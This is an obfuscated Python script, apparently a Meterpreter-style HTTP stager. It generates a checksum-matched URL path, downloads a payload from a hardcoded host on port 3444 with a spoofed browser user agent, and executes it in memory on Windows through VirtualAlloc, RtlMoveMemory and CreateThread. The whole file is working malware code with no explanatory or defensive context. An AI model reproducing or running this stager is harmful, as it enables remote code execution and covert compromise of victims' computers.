import urllib.request, string, random, ctypes as lmAObWXq
def qBIqJQxgtx(s): return sum([ord(ch) for ch in s]) % 0x100
def GBzjBAXrFmvEkLY():
	for x in range(64):
		IeJVbHGvvzZxt = ''.join(random.sample(string.ascii_letters + string.digits,3))
		ZhgexHGBZNBzcx = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
		for liLIziyb in ZhgexHGBZNBzcx:
			if qBIqJQxgtx(IeJVbHGvvzZxt + liLIziyb) == 92: return IeJVbHGvvzZxt + liLIziyb
def wiBibyA(qwwNBJ, NQBexGKsMPVDO):
	LILroRCvA = urllib.request.ProxyHandler({})
	SFmsdLmQgcQVzKV = urllib.request.build_opener(LILroRCvA)
	urllib.request.install_opener(SFmsdLmQgcQVzKV)
	PUGGnfrUa = urllib.request.Request("http://" + qwwNBJ + ":" + str(NQBexGKsMPVDO) + "/" + GBzjBAXrFmvEkLY(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})
	try:
		iuWXNDehocS = urllib.request.urlopen(PUGGnfrUa)
		try:
			if int(iuWXNDehocS.info()["Content-Length"]) > 100000: return iuWXNDehocS.read()
			else: return ''
		except: return iuWXNDehocS.read()
	except urllib.request.URLError:
		return ''
def pLkNYSBm(YkpVNqGbvMhmHTO):
	if YkpVNqGbvMhmHTO != "":
		NankthRywB = bytearray(YkpVNqGbvMhmHTO)
		hYYDdxvHejlEOHJ = lmAObWXq.windll.kernel32.VirtualAlloc(lmAObWXq.c_int(0),lmAObWXq.c_int(len(NankthRywB)), lmAObWXq.c_int(0x3000),lmAObWXq.c_int(0x40))
		UPgYNDNRS = (lmAObWXq.c_char * len(NankthRywB)).from_buffer(NankthRywB)
		lmAObWXq.windll.kernel32.RtlMoveMemory(lmAObWXq.c_int(hYYDdxvHejlEOHJ),UPgYNDNRS, lmAObWXq.c_int(len(NankthRywB)))
		vplZLSfoHMP = lmAObWXq.windll.kernel32.CreateThread(lmAObWXq.c_int(0),lmAObWXq.c_int(0),lmAObWXq.c_int(hYYDdxvHejlEOHJ),lmAObWXq.c_int(0),lmAObWXq.c_int(0),lmAObWXq.pointer(lmAObWXq.c_int(0)))
		lmAObWXq.windll.kernel32.WaitForSingleObject(lmAObWXq.c_int(vplZLSfoHMP),lmAObWXq.c_int(-1))
xVIfQGk = ''
xVIfQGk = wiBibyA("8.8.8.8", 3444)
pLkNYSBm(xVIfQGk)